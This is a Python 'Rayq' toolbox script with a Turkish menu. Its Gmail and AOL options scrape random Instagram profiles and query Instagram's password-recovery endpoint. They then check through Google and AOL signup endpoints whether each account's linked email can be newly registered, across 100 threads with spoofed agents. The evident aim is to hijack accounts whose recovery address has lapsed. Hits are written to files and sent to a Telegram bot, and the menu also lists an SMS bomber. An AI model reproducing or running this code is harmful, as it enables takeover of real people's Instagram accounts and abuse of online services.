
from cfonts import render, say

rayqheader = render(' Vip ', colors=['white', 'cyan'], align='center')
print("\033[1;31;40m═" * 67)
print(rayqheader)

    
    
print("\x1b[1;37m═" * 67)
print("                        𝐕𝐈̇𝐏 𝐑𝐀𝐘𝐐 𝐓𝐎𝐎𝐋𝐁𝐎𝐗     ")
print("\x1b[1;37m═" * 67)
print(" 1. Rayq Random Gmail            ")
print(" 2. Rayq AOL 2012-2013          ")
print(" 3. Rayq Gmail 2013             ")
print(" 4. Rayg Filtreli")
print(" 5. Rayg Car Parking")
print(" 6. Rayq İnstagram 5l")
print(" 7. Rayq Sms Bomb ")
print(" 8. Rayq Tiktok 5l")
print(" 9. Rayq Telegram 5l Kapali")

print("\x1b[1;37m═" * 67)

secim = input("Seçiminiz (1-9): ")

if secim == "1":


    print(">>> Rayq Gmail Random (genel) çalışıyor...")
    import os
    import sys
    import re
    import json
    import string
    import random
    import hashlib
    import uuid
    import time
    from datetime import datetime
    from threading import Thread, Timer
    import requests
    from requests import post as pp
    from user_agent import generate_user_agent
    from random import choice, randrange
    from cfonts import render, say
    from colorama import Fore, Style, init
    import webbrowser
    #Rayq
    INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
    IG_SIG_KEY_VERSION = 'ig_sig_key_version'
    SIGNED_BODY = 'signed_body'
    COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
    CONTENT_TYPE_HEADER = 'Content-Type'
    COOKIE_HEADER = 'Cookie'
    USER_AGENT_HEADER = 'User-Agent'
    DEFAULT_USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')
    
    GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
    GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
    REFERRER_HEADER = 'referer'
    ORIGIN_HEADER = 'origin'
    AUTHORITY_HEADER = 'authority'
    CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
    CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
    
    TOKEN_FILE = 'tl.txt'
    rayq_domain = '@gmail.com' 
    
    E = '\033[1;31m' #Red
    M = '\x1b[1;37m' #White
    total_hits = 0
    hits = 0
    bad_insta = 0
    bad_email = 0
    good_ig = 0
    infoinsta = {}
    
    RayqHeader = render('Vip', colors=['white', 'red'], align='center')
    print("\033[1;31m═" * 67)
    print(RayqHeader)
    print("\033[1;31m═" * 67)
    
    ID = input("\x1b[1;37mİd: ")
    TOKEN = input("Token:")
    
    os.system('clear')
    print("\033[1;31m═" * 67)
    print(RayqHeader)
    print("\033[1;31m═" * 67)
    
    def sayac():
        ge = hits               
        bt = bad_insta + bad_email 
        be = good_ig          
        print(f"\rTrue : {M}{ge}  {E} Bad : {M}{bt}  False : {M}{be} ", end='')
    
    def update_stats():
        sayac()
    
    def Rayq():
        try:
            alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
            n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
            n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
            host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
            headers = {
                'accept': '*/*',
                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
                'google-accounts-xsrf': '1',
                USER_AGENT_HEADER: str(generate_user_agent())
            }
            recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                            "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
            res1 = requests.get(recovery_url, headers=headers)
            tok = re.search(
                'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                res1.text
            ).group(2)
            cookies = {'__Host-GAPS': host}
            headers2 = {
                AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
                'google-accounts-xsrf': '1',
                ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
                REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                                  '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
                USER_AGENT_HEADER: generate_user_agent()
            }
            data = {
                'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                               'null,0,1,"",null,null,2,2]')
            }
            response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                                     cookies=cookies, headers=headers2, data=data)
            token_line = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict()['__Host-GAPS']
            with open(TOKEN_FILE, 'w') as f:
                f.write(f"{token_line}//{host}\n")
        except Exception as e:
            print(e)
            Rayq()
    
    Rayq()
    
    
    def check_gmail(email):
        global bad_email, hits
        try:
            if '@' in email:
                email = email.split('@')[0]
            with open(TOKEN_FILE, 'r') as f:
                token_data = f.read().splitlines()[0]
            tl, host = token_data.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
                'google-accounts-xsrf': '1',
                ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
                REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
                USER_AGENT_HEADER: generate_user_agent()
            }
            params = {'TL': tl}
            data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                    f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                    "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                    "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                    "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                    "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
            response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                          params=params, cookies=cookies, headers=headers, data=data)
            if '"gf.uar",1' in response.text:
                hits += 1
                update_stats()
                full_email = email + rayq_domain
                username, domain = full_email.split('@')
                InfoAcc(username, domain)
            else:
                bad_email += 1
                update_stats()
        except Exception:
            pass
    
    def check(email):
        global good_ig, bad_insta
        ua = generate_user_agent()
        dev = 'android-'
        device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        uui = str(uuid.uuid4())
        headers = {
            USER_AGENT_HEADER: ua,
            COOKIE_HEADER: COOKIE_VALUE,
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM
        }
        data = {
            SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                          json.dumps({
                              '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                              'adid': uui,
                              'guid': uui,
                              'device_id': device_id,
                              'query': email
                          })),
            IG_SIG_KEY_VERSION: '4'
        }
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
        if email in response:
            if rayq_domain in email:
                check_gmail(email)
            good_ig += 1
            update_stats()
        else:
            bad_insta += 1
            update_stats()       
            
    def rest(user):
        try:
            headers = {
                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'X-Pigeon-Rawclienttime': '1700251574.982',
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                       'bb343b0862d663f31a3c63f13a9f31c0'),
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                USER_AGENT_HEADER: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                    '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                    'en_GB; 161478664)'),
                'Accept-Language': 'en-GB, en-US',
                COOKIE_HEADER: COOKIE_VALUE,
                CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM,
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
                'Content-Length': '356'
            }
            data = {
                SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                              '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                              '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                              '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                              '"device_id":"android-b93ddb37e983481c",'
                              '"query":"' + user + '"}'),
                IG_SIG_KEY_VERSION: '4'
            }
            response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).json()
            rayqq = response.get('email', 'Reset None')
        except:
            rayqq = 'Reset None'
        return rayqq
        
    def date(hy):
        try:
            ranges = [
                (1279000, 2010),
                (17750000, 2011),
                (279760000, 2012),
                (900990000, 2013),
                (1629010000, 2014),
                (2500000000, 2015),
                (3713668786, 2016),
                (5699785217, 2017),
                (8597939245, 2018),
                (21254029834, 2019),
            ]
            for upper, year in ranges:
                if hy <= upper:
                    return year
            return 2023
        except Exception:
            pass    
            
    def InfoAcc(username, domain):
        global total_hits
        account_info = infoinsta.get(username, {})
        user_id = account_info.get('pk')
        full_name = account_info.get('full_name')
        followers = account_info.get('follower_count', 0)
        following = account_info.get('following_count')
        posts = account_info.get('media_count')
        bio = account_info.get('biography')
        meta_status = "True" if followers > 40 else "False"
        total_hits += 1        
        info_text = f"""
══════𝗥𝗔𝗬𝗤══════
𝐇𝐢𝐭𝐬: {total_hits}
𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: {username}
𝐌𝐚𝐢𝐥: {username}@{domain}
𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬: {followers}
𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠: {following}
𝐌𝐞𝐭𝐚: {meta_status}
𝐁𝐢𝐨: {account_info.get('biography','')}
𝐑𝐞𝐬𝐭: {rest(username)}
𝐋𝐢𝐧𝐤: 
 https://www.instagram.com/{username}
══════𝗥𝗔𝗬𝗤══════
     𝑩𝒀 ~ @RayqPy ~ @RayqTool
    """
    
        with open('rayqhit2.txt', 'a') as f:
            f.write(info_text + "\n")
        try:
            requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
        except Exception:
            pass
    
    def rayq_python():
        while True:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': int(random.randrange(10000, 21254029834)),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            headers = {'X-FB-LSD': data['lsd']}
            try:
                response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                account = response.json().get('data', {}).get('user', {})
                username = account.get('username')
                if username:
                    followers = account.get('follower_count', 0)
                    if followers < 1: 
                        continue
                    infoinsta[username] = account
                    emails = [username + rayq_domain]
                    for email in emails:
                        check(email)
            except Exception:
                pass
                
    def stats_loop():
        while True:
            update_stats()
            time.sleep(1)
    
    Thread(target=stats_loop, daemon=True).start()
    
    for _ in range(100):
        Thread(target=rayq_python).start()                            
elif secim == "2":
    print(">>> Rayq AOL Checker (2012-2013 arası) çalışıyor...")
    
    import os
    import sys
    import re
    import json
    import string
    import random
    import hashlib
    import uuid
    import time
    from datetime import datetime
    from threading import Timer
    import requests
    from requests import post as pp
    from user_agent import generate_user_agent
    from random import choice, randrange
    from cfonts import render, say
    from colorama import Fore, Style, init
    import webbrowser
    webbrowser.open("")
    init(autoreset=True)
    rayqheader = render(' AOL ', colors=['white', 'red'], align='center')
    print("\033[1;31;40m═" * 67)
    print(rayqheader)
    print("\033[1;31;40m═" * 67)
    
    id = input("- İd : ")
    token = input("- Token : ")
    os.system('clear')
    print("\033[1;31;40m═" * 67)
    print(rayqheader)
    print("  ")
    print("\033[1;31;40m═" * 67)
    
    instagram_recovery_url = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
    ig_sig_key_version = 'ig_sig_key_version'
    signed_body = 'signed_body'
    cookie_value = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
    content_type_header = 'Content-Type'
    cookie_header = 'Cookie'
    user_agent_header = 'User-Agent'
    default_user_agent = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')
    tk = 'tl.txt'
    aol_domain = '@aol.com'
    
    E_color = '\033[1;31m'
    W9 = "\033[1m\033[34m"
    M_color = '\x1b[1;37m'
    HH = '\033[1;34m'
    R_color = '\033[1;31;40m'
    F_color = '\033[1;32;40m'
    C_color = "\033[1;97;40m"
    B = '\033[1;36;40m'
    C1 = '\x1b[38;5;120m'
    
    total_hits = 0
    hits = 0
    bad_insta = 0
    bad_email = 0
    good_ig = 0
    infoinsta = {}
    
    
    
    
    
    import sys
    import os
    
    def memesex():
        os.system('clear')
        green = '\033[92m'
        red = '\033[91m'
        pink = '\033[95m'
        reset = '\033[0m'
    
        output = (
            f"\r𝐇𝐢𝐭 : {green}{hits}{reset}  "
            f"𝐁𝐚𝐝 : {red}{bad_insta + bad_email}{reset}  "
            f"𝐅𝐚𝐥𝐬𝐞 : {pink}{good_ig}{reset}    @RusyaBaskan\r"
        )
        sys.stdout.write(output)
        sys.stdout.flush()
    
    def update_stats():
        memesex()
    
    def rayqmain():
        try:
            alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
            n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
            n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
            host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
            headers = {
                'accept': '*/*',
                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                content_type_header: 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                user_agent_header: str(generate_user_agent())
            }
            recovery_url = "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
            res1 = requests.get(recovery_url, headers=headers)
            tok = re.search(
                'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                res1.text
            ).group(2)
            cookies = {'__Host-GAPS': host}
            headers2 = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                content_type_header: 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': ('https://accounts.google.com/signup/v2/createaccount'
                            '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
                user_agent_header: generate_user_agent()
            }
            data = {
                'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                               'null,0,1,"",null,null,2,2]')
            }
            response = requests.post("https://accounts.google.com/_/signup/validatepersonaldetails",
                                     cookies=cookies, headers=headers2, data=data)
            token_line = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict()['__Host-GAPS']
            with open(tk, 'w') as f:
                f.write(f"{token_line}//{host}\n")
        except Exception as e:
            print(e)
            rayqmain()
    
    rayqmain()
    
    def aol_login(email):
        global hits, bad_email
        try:
            qq = requests.get('https://login.aol.com/account/create', headers={
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                'accept-language': 'en-US,en;q=0.9',
            })
            cookies = qq.cookies.get_dict()
            tm1 = str(time.time()).split('.')[0]
            cookies.update({
                'gpp': 'DBAA',
                'gpp_sid': '-1',
                '__gads': f'ID=c0M0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA',
                '__gpi': f'UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ',
                'cmp': f't={tm1}&j=0&u=1---',
            })
            text = qq.text
            specData = text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
            specId = text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
            crumb = text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
            sessionIndex = text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
            acrumb = text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
            try:
                os.remove('aol.rq.txt')
                os.remove('aol.cokie.txt')
            except:
                pass
            with open('aol.rq.txt', 'a') as t:
                t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")
            with open('aol.cokie.txt', 'a') as g:
                g.write(str(cookies) + '\n')
            with open("aol.rq.txt", "r") as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')
            with open("aol.cokie.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())
            headers = {
                'authority': 'login.aol.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://login.aol.com',
                'referer': f'https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                'x-requested-with': 'XMLHttpRequest',
            }
            params = {
                'validateField': 'userId',
            }
            if '@' in email:
                uname = email.split('@')[0]
            else:
                uname = email
            data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=ahmed&lastName=Mahos&userid-domain=yahoo&userId={uname}&password=Drahmed2006##$$&mm=10&dd=24&yyyy=2000&signup='
            res = requests.post('https://login.aol.com/account/module/create', params=params, headers=headers, data=data, cookies=cookies).text
            if '{"errors":[]}' in res:
                hits += 1
                memesex()
                if '@' not in email:
                    ok = email + '@aol.com'
                    uname, dom = ok.split('@')
                    InfoAcc(uname, dom)
                else:
                    uname, dom = email.split('@')
                    InfoAcc(uname, dom)
            else:
                global bad_email
                bad_email += 1
                memesex()
        except Exception as e:
            print(e)
    
    
    def check_aol(email):
        aol_login(email)
    
    def check(email):
        global good_ig, bad_insta
        ua = generate_user_agent()
        dev = 'android-'
        device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        uui = str(uuid.uuid4())
        headers = {
            user_agent_header: ua,
            cookie_header: cookie_value,
            content_type_header: 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        data = {
            signed_body: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                          json.dumps({
                              '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                              'adid': uui,
                              'guid': uui,
                              'device_id': device_id,
                              'query': email
                          })),
            ig_sig_key_version: '4'
        }
        response = requests.post(instagram_recovery_url, headers=headers, data=data).text
        if email in response:
            if aol_domain in email:
                check_aol(email)
            good_ig += 1
            update_stats()
        else:
            bad_insta += 1
            update_stats()
    
    def rest(user):
        try:
            headers = {
                'x-pigeon-session-id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'x-pigeon-rawclienttime': '1700251574.982',
                'x-ig-connection-speed': '-1kbps',
                'x-ig-bandwidth-speed-kbps': '-1.000',
                'x-ig-bandwidth-totalbytes-b': '0',
                'x-ig-bandwidth-totaltime-ms': '0',
                'x-bloks-version-id': ('c80c5fb30dfae9e273e4009f03b18280'
                                       'bb343b0862d663f31a3c63f13a9f31c0'),
                'x-ig-connection-type': 'wifi',
                'x-ig-capabilities': '3brtvw==',
                'x-ig-app-id': '567067343352427',
                user_agent_header: ('instagram 100.0.0.17.129 android (29/10; 420dpi; '
                                    '1080x2129; samsung; sm-m205f; m20lte; exynos7904; '
                                    'en_gb; 161478664)'),
                'accept-language': 'en-gb, en-us',
                cookie_header: cookie_value,
                content_type_header: 'application/x-www-form-urlencoded; charset=UTF-8',
                'accept-encoding': 'gzip, deflate',
                'host': 'i.instagram.com',
                'x-fb-http-engine': 'liger',
                'connection': 'keep-alive',
                'content-length': '356'
            }
            data = {
                signed_body: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                              '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                              '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                              '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                              '"device_id":"android-b93ddb37e983481c",'
                              '"query":"' + user + '"}'),
                ig_sig_key_version: '4'
            }
            response = requests.post(instagram_recovery_url, headers=headers, data=data).json()
            matrx_reset = response.get('email', 'Reset None')
        except:
            matrx_reset = 'Reset None'
        return matrx_reset
    
    def date(hy):
        try:
            ranges = [
                (1279000, 2010),
                (17750000, 2011),
                (279760000, 2012),
                (900990000, 2013),
                (1629010000, 2014),
                (2500000000, 2015),
                (3713668786, 2016),
                (5699785217, 2017),
                (8597939245, 2018),
                (21254029834, 2019),
            ]
            for upper, year in ranges:
                if hy <= upper:
                    return year
            return 2023
        except Exception:
            return "Unknown"
    
    def InfoAcc(username, domain):
        global total_hits
        account_info = infoinsta.get(username, {})
        user_id = account_info.get('pk')
        full_name = account_info.get('full_name')
        followers = account_info.get('follower_count')
        following = account_info.get('following_count')
        posts = account_info.get('media_count')
        bio = account_info.get('biography')
        calc_date = date(user_id) if user_id else "Unknown"
        total_hits += 1
        tlg = f"""    
𝐇𝐢𝐭 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈̇𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦
══════𝗥𝗔𝗬𝗤══════
𝐇𝐢𝐭𝐬 : [ {total_hits} ]
𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 : [ {username} ]
𝐌𝐚𝐢𝐥 : [ {username}@{domain} ]
𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : [ {followers} ]
𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : [ {following} ]
𝐏𝐨𝐬𝐭 : [ {posts} ]
𝐃𝐚𝐭𝐞 : [ {calc_date} ]
𝐁𝐢𝐨 : [ {bio} ]
𝐑𝐞𝐬𝐭 : [ {rest(username)} ]
══════𝗥𝗔𝗬𝗤══════
𝐁𝐲 ~ @RayqPy ~ @RayqTool
    
    """
        with open('Aol.txt', 'a') as f:
            f.write(tlg + "\n")
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text={tlg}")
        except Exception:
            pass
    
    def rayq_python():
        while True:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': int(random.randrange(279760000, 900990000)),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            headers = {'x-fb-lsd': data['lsd']}
            try:
                response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                account = response.json().get('data', {}).get('user', {})
                username = account.get('username')
                if username:
                    infoinsta[username] = account
                    emails = [username + aol_domain]
                    for email in emails:
                        check(email)
            except Exception:
                pass
    
    def stats_loop():
        while True:
            update_stats()
            time.sleep(1)
    
    from threading import Thread
    Thread(target=stats_loop, daemon=True).start()
    
    for _ in range(100):
        Thread(target=rayq_python).start()

elif secim == "3":
    print(">>> Rayq Gmail Checker (sadece 2013) çalışıyor...")
    import os
    import sys
    import re
    import json
    import string
    import random
    import hashlib
    import uuid
    import time
    from datetime import datetime, timedelta
    from threading import Thread, Timer
    import requests
    from requests import post as pp
    from user_agent import generate_user_agent
    from random import choice, randrange
    from cfonts import render, say
    from colorama import Fore, Style, init
    import webbrowser
    
    
    
    
    
    
    
    
    rayqig = {
        "instagram_recovery_url": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
        "ig_sig_key_version": "ig_sig_key_version",
        "signed_body": "signed_body",
        "cookie_value": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
        "content_type_header": "Content-Type",
        "cookie_header": "Cookie",
        "user_agent_header": "User-Agent",
        "default_user_agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
        ),
        "google_accounts_url": "https://accounts.google.com",
        "google_accounts_domain": "accounts.google.com",
        "referrer_header": "referer",
        "origin_header": "origin",
        "authority_header": "authority",
        "content_type_form": "application/x-www-form-urlencoded; charset=UTF-8",
        "content_type_form_alt": "application/x-www-form-urlencoded;charset=UTF-8",
        "token_file": "tl.txt",
        "rayqdomain": "@gmail.com"
    }
    
    # Renkler
    E = '\033[1;31m'
    W9 = "\033[1m\033[34m"
    M = '\x1b[1;37m'
    HH = '\033[1;34m'
    R = '\033[1;31;40m'
    F = '\033[1;32;40m'
    C = "\033[1;97;40m"
    B = '\033[1;36;40m'
    C1 = '\x1b[38;5;120m'
    P1 = '\x1b[38;5;150m'
    P2 = '\x1b[38;5;190m'
    Y = '\033[1;33m'
    Z = '\033[1;31m'
    X = '\033[1;33m'
    Z1 = '\033[2;31m'
    
    red = "\033[1m\033[31m"
    green = "\033[1m\033[32m"
    yellow = "\033[1m\033[33m"
    blue = "\033[1m\033[34m"
    cyan = "\033[1m\033[36m"
    magenta = "\033[1m\033[35m"
